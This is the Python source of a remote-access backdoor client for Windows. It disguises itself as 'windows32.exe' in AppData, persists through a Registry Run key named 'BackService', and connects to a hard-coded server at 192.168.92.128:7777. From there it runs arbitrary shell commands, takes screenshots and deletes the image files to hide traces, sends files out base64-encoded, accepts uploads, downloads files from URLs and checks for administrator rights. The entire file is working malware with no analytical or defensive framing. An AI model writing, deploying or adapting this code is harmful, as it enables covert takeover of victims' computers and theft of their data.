#!/usr/bin/python
import shutil
import socket
import subprocess
import json
import os
import base64
import sys
import time
import requests
from mss import mss


def send_j(data):
    json_data = json.dumps(data)
    print(json_data)
    s.send(json_data.encode('utf-8'))

def recv_j():
        data = ""
        while True:
            try:
                data = data + s.recv(1024).decode('utf-8')
                print(data)#receiving chunks of 1024 bytes until json.loads(data) returns a correct json format
                return json.loads(data) #
            except ValueError: #if the output of json.loads(data) is not complete (not in json format)a
                continue

def web_download(url):
    response = requests.get(url)
    file_name = url.split("/")[-1] #last part of the url after /
    with open(file_name, "wb") as f:
        f.write(response.content)

def screenshot():
    with mss() as screenshot:
        screenshot.shot()

def check_privs(): #check if user is admin by accessing an admin folder
    global admin
    try:
        tmp = os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\windows')]))
    except:
        admin = "User Privileges"
    else:
        admin = "Administrator Privileges"


def connect():
    while True:
        time.sleep(10) #reconnect every 10 seconds
        try:
            s.connect(("192.168.92.128", 7777))  # server IP and to which port to connect to
            shell()
            break
        except: #call connect function again until we get shell()
            connect()

def shell():
    while True:
        cmd = recv_j() # receive command from server

        if cmd == "exit_client":
            break

        elif cmd == "help":
            help_opt = '''
check           : Check user"s privileges 
download <file> : Download file from host
Upload <file>   : Upload file to host
wget <URL>      : Download file from a URL 
screenshot      : Take a screenshot
exit_client     : Disconnect current host 
exit_server     : Disconnect server
                        '''
            send_j(help_opt)
        elif cmd[:2] == "cd" and len(cmd) > 2:
            try:
                os.chdir(cmd[3:]) #change directory to what's after "cd"
            except:
                continue

        elif cmd[:10] == "screenshot":
            try:
                screenshot() #take screenshot and its always saved as monitor-1.png
                with open("monitor-1.png","rb") as f:
                    send_j(base64.b64encode(f.read()).decode('utf-8'))
                    f.close()
                os.remove("monitor-1.png") #remove screenshot to hiding artifact
            except:
                send_j("failed to take screenshot")

        elif cmd[:5] == "check":
            check_privs()
            send_j(admin)

        elif cmd[:4] == "wget":
            url = cmd[5:]
            try:
                web_download(url)
                send_j("File Downloaded successfully!")
            except:
                send_j("Failed to download")



        elif cmd[:8] == "download":
            try:
                with open(cmd[9:], "rb") as f:
                    send_j(base64.b64encode(f.read()).decode('utf-8'))
                    f.close()
            except:
                error = "File not found"
                send_j(base64.b64encode(error.encode('utf-8')).decode('utf-8'))

        elif cmd[:6] == "upload":
            try:
                with open(cmd[7:], "wb") as f:
                    res = recv_j()
                    f.write(base64.b64decode(res))
                    f.close()
            except:
                send_j(base64.b64encode("Failed to upload"))
        else: #for all other commands send output to server
            proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output = proc.stdout.read() + proc.stderr.read()
            send_j(output.decode('utf-8')) #send output to server

#adding a payload into registry run key

location = os.environ["appdata"] + "\\windows32.exe" #set location naming
if not os.path.exists(location):
    shutil.copyfile(sys.executable,location) #copy the executable to location set before as name windows32.exe (if compiled)
    subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v BackService /t REG_SZ /d "' + location + '"', shell=True)

#socket creation
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

connect()

s.close()